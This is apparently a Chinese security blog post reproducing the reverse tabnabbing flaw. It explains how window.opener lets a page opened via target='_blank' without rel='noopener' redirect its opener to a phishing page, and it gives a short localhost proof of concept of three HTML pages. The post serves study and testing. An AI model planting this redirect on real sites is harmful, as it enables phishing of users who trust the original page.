---
title: Reverse_Tabnabbing 复现
published: 2025-03-09 16:43:11
tags: [WEB安全,漏洞复现]
category: 安全
draft: false
---

# Reverse_Tabnabbing 复现

### 利用Reverse_Tabnabbing进行钓鱼攻击

> 什么是`Reverse_Tabnabbing` ：https://owasp.org/www-community/attacks/Reverse_Tabnabbing
> 

> 便于理解：https://xz.aliyun.com/t/7080?time__1311=n4%2BxnD0Dy7itGQei%3DDkDlhjeP7KRM2Y%2BDxD54%3Dx
> 
1. 原理
    
    该攻击意为在A页面中打开一个新的页面B而不是替换原始页面，此时B页面可以对A页面进行某些操作，本漏洞利用的操作为将A页面修改为其他的页面，由于用户对页面A是信任的，因此此漏洞的主要利用点是将A页面改为钓鱼页面C
    
    如果在页面中使用标签，具有target属性，其值为`_blank`,同时没有使用`rel="noopener"`属性，那将会产生该漏洞
    
    当B页面被打开的时候，会有一个`web API`接口为`window.opener`,该接口 返回打开当前窗口的那个窗口的引用，例如：在window A中打开了window B，B.opener 返回 A，而该接口具有如下操作
    
    ```python
    opener.closed: Returns a boolean value indicating whether a window has been closed or not.
    opener.frames: Returns all iframe elements in the current window.
    opener.length: Returns the number of iframe elements in the current window.
    opener.opener: Returns a reference to the window that created the window.
    opener.parent: Returns the parent window of the current window.
    opener.self: Returns the current window.
    opener.top: Returns the topmost browser window.
    ```
    
    [**Napping: 1.0.1**](https://www.notion.so/Napping-1-0-1-13ab61af428980c38812f222dc72a30f?pvs=21)
    
    也是使用了`Reverse_Tabnabbing`
    
2. 测试漏洞的时候在`Google`可以测试，`firefox`不行，不知道为什么
    
    测试代码如下
    
    ```python
    # A页面
    <html>
    <title>A</title>
     <body>
      <li><a href="http://localhost/b.html" rel="opener" target="_blank" >B</a></li>
      <button onclick="window.open('http://localhost/b.html')">B</button>
     </body>
    </html>
    # B页面
    <html>
    <title>B</title>
     <body>
      <script>
       if (window.opener) {
          window.opener.location = "http://localhost/c.html";
       }else{alert("error");}
      </script>
     </body>
    </html>
    # C页面
    <!DOCTYPE html>
    <html>
    <head>
        <title>C</title>
    </head>
    <body>
    <li><a href="http://localhost/b.html" rel="opener" target="_blank">B</a></li>
      <button onclick="window.open('http://localhost/b.html')">B</button>
    </body>
    </html>
    ```